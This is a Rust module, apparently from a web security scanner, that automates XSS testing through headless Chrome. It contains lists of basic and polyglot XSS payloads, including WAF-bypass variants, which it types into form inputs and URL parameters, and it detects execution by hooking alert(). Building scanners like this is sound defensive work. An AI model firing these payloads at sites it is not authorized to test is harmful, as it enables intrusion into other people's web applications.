use anyhow::Result;
use headless_chrome::Tab;
use std::sync::Arc;
use tracing::info;

use crate::core::scanner::{Finding, FindingCategory, Severity};

/// XSS payloads for DOM testing — basic
static XSS_PAYLOADS: &[&str] = &[
    "<script>alert('XSS_SENTINEL')</script>",
    "<img src=x onerror=alert('XSS_SENTINEL')>",
    "'\"><script>alert('XSS_SENTINEL')</script>",
    "<svg onload=alert('XSS_SENTINEL')>",
];

/// Polyglot XSS payloads — designed to bypass multiple contexts at once
/// (attribute, script, HTML tag, event handler)
static XSS_POLYGLOTS: &[&str] = &[
    // Javasript URL handler + event + tag break
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS_SENTINEL') )//",
    // Attribute breakout + event handler
    "'\"><img/src/onerror=alert('XSS_SENTINEL')>",
    // Template literal injection (for JS template strings)
    "${alert('XSS_SENTINEL')}",
    // SVG/XML namespace injection
    "<svg><animate onbegin=alert('XSS_SENTINEL') attributeName=x dur=1s>",
    // Math tag (MathML — works in some browsers)
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=x onerror=alert('XSS_SENTINEL')&gt;\">",
    // Event without parentheses (bypasses WAF regex for alert())
    "<img src=x onerror=alert`XSS_SENTINEL`>",
    // Encoded event handler payload
    "<body onpageshow=alert('XSS_SENTINEL')>",
    // Details/Summary auto-trigger
    "<details open ontoggle=alert('XSS_SENTINEL')>",
];

pub struct XssDetector;

impl XssDetector {
    pub fn new() -> Self {
        Self
    }

    /// Inject XSS payloads into input fields and detect JS alert execution
    pub fn scan(&self, tab: &Arc<Tab>, target: &str) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        // Intercept alert/prompt/confirm + DOM mutation observer for script injection
        let _ = tab.evaluate(
            r#"
            window.__xss_triggered = false;
            window.__xss_payload = '';
            window.__xss_dom_mutation = false;
            window.alert = function(m) { window.__xss_triggered = true; window.__xss_payload = String(m); };
            window.prompt = function(m) { window.__xss_triggered = true; window.__xss_payload = String(m); return null; };
            window.confirm = function(m) { window.__xss_triggered = true; window.__xss_payload = String(m); return false; };
            // Monitor DOM for injected script/event handler nodes
            new MutationObserver(function(mutations) {
                mutations.forEach(function(m) {
                    m.addedNodes.forEach(function(node) {
                        if (node.nodeName === 'SCRIPT' || (node.outerHTML && node.outerHTML.match(/on\w+\s*=/i))) {
                            window.__xss_dom_mutation = true;
                        }
                    });
                });
            }).observe(document.body || document.documentElement, {childList: true, subtree: true});
            "#,
            false,
        );

        let input_selectors = &[
            "input[type='text']",
            "input:not([type])",
            "textarea",
            "input[type='search']",
            "input[type='url']",
            "input[type='email']",
            "input[type='tel']",
            "[contenteditable='true']",
        ];

        for selector in input_selectors {
            let elements = match tab.find_elements(selector) {
                Ok(els) => els,
                Err(_) => continue,
            };

            for element in elements {
                for payload in XSS_PAYLOADS {
                    // Clear & type payload into input
                    let _ = element.type_into(payload);

                    // Press Enter via tab JS evaluation (Element has no press_key)
                    let _ = tab.evaluate(
                        "document.activeElement && document.activeElement.form && document.activeElement.form.submit()",
                        false,
                    );

                    std::thread::sleep(std::time::Duration::from_millis(250));

                    let triggered = Self::check_xss_triggered(tab);
                    if triggered {
                        info!("[XSS] DOM XSS confirmed: {}", payload);
                        let mut f = Finding::new(
                            Severity::High,
                            FindingCategory::Xss,
                            "DOM-based XSS Detected",
                            format!("XSS confirmed via JS alert(). Payload: {}", payload),
                            target.to_string(),
                        );
                        f.evidence = Some(payload.to_string());
                        f.remediation = Some(
                            "Sanitize output; use textContent not innerHTML; apply CSP.".to_string(),
                        );
                        findings.push(f);
                        Self::reset_xss_state(tab);
                        break;
                    }
                }
            }
        }

        // Polyglot XSS via input fields (higher bypass rate)
        for selector in input_selectors {
            let elements = match tab.find_elements(selector) {
                Ok(els) => els,
                Err(_) => continue,
            };

            for element in elements {
                for payload in XSS_POLYGLOTS {
                    let _ = element.type_into(payload);
                    let _ = tab.evaluate(
                        "document.activeElement && document.activeElement.form && document.activeElement.form.submit()",
                        false,
                    );
                    std::thread::sleep(std::time::Duration::from_millis(250));

                    if Self::check_xss_triggered(tab) {
                        info!("[XSS] Polyglot DOM XSS confirmed: {}", payload);
                        let mut f = Finding::new(
                            Severity::High,
                            FindingCategory::Xss,
                            "DOM-based XSS (Polyglot Payload)",
                            format!("XSS confirmed via polyglot payload: {}", payload),
                            target.to_string(),
                        );
                        f.evidence = Some(payload.to_string());
                        f.remediation = Some(
                            "Sanitize output; use textContent not innerHTML; apply CSP.".to_string(),
                        );
                        findings.push(f);
                        Self::reset_xss_state(tab);
                        break;
                    }
                }
            }
        }

        // Reflected XSS via URL parameter (basic + polyglot)
        let all_reflected_payloads: Vec<&str> = XSS_PAYLOADS.iter()
            .chain(XSS_POLYGLOTS.iter())
            .copied()
            .collect();
        for payload in &all_reflected_payloads {
            let encoded = percent_encode(payload);
            let test_url = if target.contains('?') {
                format!("{}&q={}", target, encoded)
            } else {
                format!("{}?q={}", target, encoded)
            };

            Self::reset_xss_state(tab);

            let nav_ok = tab.navigate_to(&test_url)
                .and_then(|t| t.wait_until_navigated())
                .is_ok();

            if nav_ok {
                std::thread::sleep(std::time::Duration::from_millis(300));
                if Self::check_xss_triggered(tab) {
                    info!("[XSS] Reflected XSS: {}", payload);
                    let mut f = Finding::new(
                        Severity::High,
                        FindingCategory::Xss,
                        "Reflected XSS (URL Parameter)",
                        format!("XSS via URL param. Payload: {}", payload),
                        test_url,
                    );
                    f.evidence = Some(payload.to_string());
                    findings.push(f);
                    break;
                }
            }
        }

        Ok(findings)
    }

    fn check_xss_triggered(tab: &Arc<Tab>) -> bool {
        let alert_triggered = tab.evaluate("!!window.__xss_triggered", false)
            .ok()
            .and_then(|v| v.value.as_ref().and_then(|v| v.as_bool()))
            .unwrap_or(false);
        let dom_mutation = tab.evaluate("!!window.__xss_dom_mutation", false)
            .ok()
            .and_then(|v| v.value.as_ref().and_then(|v| v.as_bool()))
            .unwrap_or(false);
        alert_triggered || dom_mutation
    }

    fn reset_xss_state(tab: &Arc<Tab>) {
        let _ = tab.evaluate(
            r#"
            window.__xss_triggered = false;
            window.__xss_payload = '';
            window.__xss_dom_mutation = false;
            window.alert = function(m) { window.__xss_triggered = true; window.__xss_payload = String(m); };
            "#,
            false,
        );
    }
}

fn percent_encode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char);
            }
            _ => {
                out.push_str(&format!("%{:02X}", b));
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_percent_encode() {
        let enc = percent_encode("<script>");
        assert!(!enc.contains('<'));
        assert!(!enc.contains('>'));
        assert!(enc.contains('%'));
    }
}
